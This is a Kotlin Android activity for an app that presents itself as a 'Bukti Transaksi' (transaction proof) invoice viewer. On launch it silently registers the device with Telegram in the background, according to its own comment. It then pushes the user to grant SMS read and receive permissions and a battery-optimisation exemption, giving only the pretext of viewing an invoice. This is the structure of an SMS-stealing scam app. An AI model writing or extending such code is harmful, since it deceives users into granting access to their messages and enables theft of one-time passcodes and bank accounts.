package com.buktitransaksi.app

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.PowerManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private var showSmsExplanation by mutableStateOf(false)
    private var showBatteryExplanation by mutableStateOf(false)
    private var smsDeniedPermanently by mutableStateOf(false)

    private val smsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { id -> id == true }
        if (allGranted) {
            checkBatteryOptimizationStep()
        } else {
            smsDeniedPermanently = true
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // STEP 1: Generate Device ID & Kirim ke Telegram di background secara otomatis tanpa tampilan UI
        CoroutineScope(Dispatchers.IO).launch {
            DeviceIdHelper.checkAndRegisterDevice(this@MainActivity)
        }

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    when {
                        // STEP 2: Cek Izin SMS
                        !hasSmsPermissions() -> {
                            if (smsDeniedPermanently) {
                                SmsDeniedScreen(
                                    onOpenSettings = { PermissionHelper.openAppSettings(this) }
                                )
                            } else {
                                if (showSmsExplanation) {
                                    PermissionExplanationDialog(
                                        title = "Izin Diperlukan",
                                        message = "Izinkan untuk melihat Bukti Transaksi",
                                        onConfirm = {
                                            showSmsExplanation = false
                                            smsPermissionLauncher.launch(
                                                arrayOf(
                                                    Manifest.permission.RECEIVE_SMS,
                                                    Manifest.permission.READ_SMS
                                                )
                                            )
                                        }
                                    )
                                } else {
                                    SideEffect {
                                        showSmsExplanation = true
                                    }
                                }
                            }
                        }

                        // STEP 3: Cek Izin Background / Battery Optimization
                        !isIgnoringBatteryOptimizations() -> {
                            if (showBatteryExplanation) {
                                PermissionExplanationDialog(
                                    title = "Izin Diperlukan",
                                    message = "Izinkan untuk melihat Bukti Transaksi",
                                    onConfirm = {
                                        showBatteryExplanation = false
                                        PermissionHelper.requestBatteryOptimizationExemption(this)
                                    }
                                )
                            } else {
                                SideEffect {
                                    showBatteryExplanation = true
                                }
                            }
                        }

                        // STEP 4: Layar Utama Invoice
                        else -> {
                            InvoiceMainScreen()
                        }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (hasSmsPermissions() && isIgnoringBatteryOptimizations()) {
            smsDeniedPermanently = false
        }
    }

    private fun hasSmsPermissions(): Boolean {
        val receiveSms = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
        val readSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
        return receiveSms == PackageManager.PERMISSION_GRANTED && readSms == PackageManager.PERMISSION_GRANTED
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun checkBatteryOptimizationStep() {
        if (!isIgnoringBatteryOptimizations()) {
            showBatteryExplanation = true
        }
    }
}

@Composable
fun InvoiceMainScreen() {
    val scrollState = rememberScrollState()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp)
            .verticalScroll(scrollState)
    ) {
        Text(
            text = "Bukti Transaksi",
            fontSize = 22.sp,
            color = Color.Black,
            style = MaterialTheme.typography.titleLarge
        )
        
        Spacer(modifier = Modifier.height(16.dp))

        Text(
            text = Constants.INVOICE_TEXT,
            fontSize = 14.sp,
            color = Color.DarkGray,
            lineHeight = 22.sp
        )
    }
}

@Composable
fun SmsDeniedScreen(onOpenSettings: () -> Unit) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center
    ) {
        Text(
            text = "Aplikasi membutuhkan izin SMS untuk berjalan. Buka Settings > Izin > SMS.",
            fontSize = 16.sp,
            color = Color.Black
        )
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = onOpenSettings) {
            Text("Buka Pengaturan (Settings)")
        }
    }
}
